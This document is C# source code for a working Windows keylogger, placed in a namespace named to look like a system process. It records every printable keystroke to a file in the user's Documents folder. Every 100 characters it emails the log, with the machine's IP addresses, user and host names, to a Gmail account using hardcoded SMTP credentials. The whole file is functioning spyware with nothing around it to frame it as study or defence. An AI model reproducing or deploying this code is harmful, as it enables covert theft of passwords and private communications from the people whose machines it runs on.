using Microsoft.Graph.Me.SendMail;
using Microsoft.Graph.Models;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace Windows_Local_Host_Process
{
    internal class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeytrokes = 0;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\KeyStrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = new StreamWriter(path))
                {

                }
            }

            //1 - capture keystrokes and displaying in the console 

            while(true)
            {
                //pause and let other programs get the chance to run.
                Thread.Sleep(5);

                //check all key states
                for (int i = 32; i < 127;i++)
                {
                    int keystate = GetAsyncKeyState(i);

                    //pring to the console
                    if (keystate == 32769)
                    {
                        Console.Write((char) i + ", ");

                        //2 - store strokes in to a text file.

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeytrokes++;


                        //send every 100 characters

                        if (numberOfKeytrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }

                //3 - periodically send contents of the file to an external email address.

            }
            
        }

        static async void SendNewMessage()
        {
            //send the contents of the text file to an external email address.

            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String filePath = folderName + @"\KeyStrokes.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //create an email message

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody+= address.ToString();
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost: " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("keyloggeremail458@gmail.com");
            mailMessage.To.Add("keyloggeremail458@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = false;
            client.Credentials = new System.Net.NetworkCredential("keyloggeremail458@gmail.com", "keyloggerpass*");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}